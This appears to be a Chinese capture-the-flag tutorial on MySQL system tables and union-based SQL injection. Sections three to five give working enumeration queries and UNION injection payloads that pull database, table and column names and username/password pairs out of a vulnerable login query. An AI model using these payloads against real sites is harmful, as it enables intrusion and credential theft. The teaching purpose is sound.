### 一、MySQL 系统表简介

MySQL 的 **系统表** 存储在 `information_schema` 和 `mysql` 数据库中。它们保存了数据库的元数据，如表、列、用户权限、字符集等信息。

1. `information_schema`: 存储 MySQL 数据库服务器的元数据信息，用户可以查询这些表来了解数据库的结构。

2. `mysql`: 存储 MySQL 用户账户、权限等安全相关的信息。通常只有高权限用户才能访问。

------

### 二、`information_schema` 数据库

`information_schema` 是 MySQL 的元数据表，主要包含以下常用的系统表：

| 系统表             | 描述                                           |
| ------------------ | ---------------------------------------------- |
| `TABLES`           | 存储所有数据库中表的信息，如表名、表类型等。   |
| `COLUMNS`          | 存储所有数据库中列的信息，如列名、数据类型等。 |
| `SCHEMATA`         | 存储所有数据库的名称。                         |
| `KEY_COLUMN_USAGE` | 存储主键、外键等约束信息。                     |
| `USER_PRIVILEGES`  | 存储用户权限信息。                             |
| `CHARACTER_SETS`   | 存储 MySQL 支持的字符集信息。                  |
| `COLLATIONS`       | 存储排序规则相关信息。                         |

------

### 三、常见的 SQL 注入信息枚举过程

通过 **SQL 注入** 攻击，参赛者可以利用系统表来泄露数据库中的敏感信息。以下是常见的步骤：

**获取数据库名称**

```sql
#获取当前 MySQL 实例中所有数据库的名称。
SELECT schema_name FROM information_schema.schemata;
```

**获取表名称**

```sql
#查询某个数据库 (`table_schema`) 中的所有表名。
SELECT table_name FROM information_schema.tables WHERE table_schema='目标数据库';
```

**获取列名称**

```sql
#查询某个表中的所有列名。
SELECT column_name FROM information_schema.columns WHERE table_name='目标表' AND table_schema='目标数据库';
```

**获取表的数据** 一旦知道了表名和列名，可以通过 SQL 注入来获取表内的数据，例如：

```
SELECT login_name, login_passwd FROM lesson_user;
```

------

### 四、基于 `information_schema` 的 SQL 注入示例

假设一个网站存在 SQL 注入漏洞，我们将通过注入获取数据库信息。以下是一个注入场景示例。

假设网站存在以下查询：

```
SELECT * FROM users WHERE username='$username' AND password='$password';
```

攻击者可以通过修改输入来进行 SQL 注入。

注入步骤

**获取数据库名称**

```
#通过 `UNION SELECT` 合并查询，列出所有数据库名称。
' OR 1=1 UNION SELECT schema_name, NULL FROM information_schema.schemata #
```

**获取表名**

```sql
 #查询特定数据库中的所有表。
' OR 1=1 UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='目标数据库'
```

**获取列名**

```sql
#查询特定表中的所有列名。
' OR 1=1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' #
```

**获取敏感数据**

```sql
#获取 `users` 表中的用户名和密码。
' OR 1=1 UNION SELECT username, password FROM users #
```

------

### 五、MySQL 用户账户表 (`mysql.user`)

`mysql.user` 是存储 MySQL 用户信息的表，通常只有高权限用户可以访问。

| 列名          | 描述                                                       |
| ------------- | ---------------------------------------------------------- |
| `Host`        | 用户允许登录的主机。                                       |
| `User`        | 用户名。                                                   |
| `Password`    | 用户密码（MySQL 8.0 之前存储为 `authentication_string`）。 |
| `Select_priv` | 是否有 `SELECT` 权限。                                     |
| `Insert_priv` | 是否有 `INSERT` 权限。                                     |
| ...           | 其他权限字段，如 `UPDATE`, `DELETE` 等。                   |

通过 SQL 注入，攻击者可以尝试获取用户表中的信息，从而进行进一步攻击。

```sql
#列出 MySQL 用户
SELECT user, host FROM mysql.user;
```

